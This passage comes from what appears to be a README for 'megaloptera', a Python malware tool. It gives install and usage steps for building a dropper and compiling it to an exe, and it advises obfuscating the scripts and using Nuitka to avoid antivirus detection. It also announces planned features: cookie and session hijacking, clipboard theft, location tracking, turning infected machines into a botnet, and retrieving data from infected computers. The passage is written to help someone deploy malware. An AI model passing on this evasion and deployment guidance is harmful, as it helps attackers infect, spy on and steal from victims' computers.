cd megaloptera
pip install -r /path/to/requirements.txt
or click on auto-install-lib
```
## Usage
1. Open to megaloptera.py
2. Enter your evasion method (telegram, tunnel, server ...)
3. Now you can use dropper.py modify it then compile to exe
4. and the software is done

## AV escape and exe conversion
The main problem of megaloptera is that he get flagged by few av on virus total, 
i recommand to firstly encrypt/obfucate the main scripts (https://pyob.oxyry.com/) then you can use 
Nuitka to convert it to exe. I dont recommand to use pyinstaller since av easly flagged the build as a virus even though some of them are not

## I am currently working on a new versions of megaloptera wich will be uploaded in few weeks (might be days if i dont sleep)
## features
Megaloptera V2.0 will have the same features than the old one plus few ones:
- ~~clipboard~~ 
- ~~cookies/session hijacking~~ 
- more precise location
- ~~a POO program (wich is faster and make the code easier)~~
- ~~dropper for Antivirus bypass (a dropper is a program that is harmless cant be detected as a virus, then when executed it's downloading or building the virus in order to execute it)~~
- more features (i will add when i'll got an idea)

## new functionnality
Megaloptera v2.0 will also let you choose if you want to transform the infected machine into a botnet in order to have control on it for later operation.
Moreover, i will implement a new way to retrieve data from an infected computer, it will be from encrypted server (more details/explication later)
